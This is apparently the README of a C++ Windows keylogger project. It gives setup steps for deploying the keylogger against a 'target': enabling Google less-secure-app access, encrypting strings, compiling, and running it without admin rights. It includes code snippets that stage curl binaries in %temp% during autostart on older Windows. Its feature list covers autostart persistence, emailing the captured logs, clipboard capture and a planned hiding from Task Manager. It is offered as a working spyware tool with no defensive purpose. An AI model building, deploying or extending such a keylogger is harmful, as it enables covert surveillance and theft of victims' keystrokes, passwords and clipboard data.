## Default Instalation:
* Enable the [less secure apps](https://myaccount.google.com/lesssecureapps?pli=1&rapt=AEjHL4MGU5z42UW4nH0dAY8_FeWykqble-hNWbVnZX6rX9boPYuAtJ6h3Hps1rZt7aL17kNzR-R_m8pDgmLYmagc5mzRVeC2Zg)
* Set the const variables in .cpp (don't forgot to encrypt strings)
* Compile it
* Run the keylogger (but not as admin)
* Enjoy

## Instalation if ur target use windows older than 1706
* In the function send() in string "cmd" add .exe after "curl"
* After ```<< "\nmove " + decrypt(exe_name + "!&ufnq&")+"\n" ``` add in the function autostart() this:
``` 
 << "move curl.exe %temp%\n";
 << "move curl-ca-bundle.crt %temp%\n";
 << "move libcurl-x64.def %temp%\n";
 << "move libcurl-x64.dll %temp%\n";   
```
* To same directory where keylogger is gonna boot first time  put files from /bin/ from [curl for windows](https://curl.se/windows/) (32bit version)
* Back to Default Instalation

- [x] automaticly installing and adding to autostart
- [x] sending logs on email
- [x] Logging date every half an hour
- [x] Logging Clipboard
- [ ] encrypt logs
- [ ] hide it from taskmanager

[VirusTotal scan](https://www.virustotal.com/gui/file/22e1be46de7e6be7efe9d6edbf02d9ea0429a13bf5748db916c7a5a94aa9f18d/detection)

if you don't need all of these features, just keylogger - checkout my older keylogger project



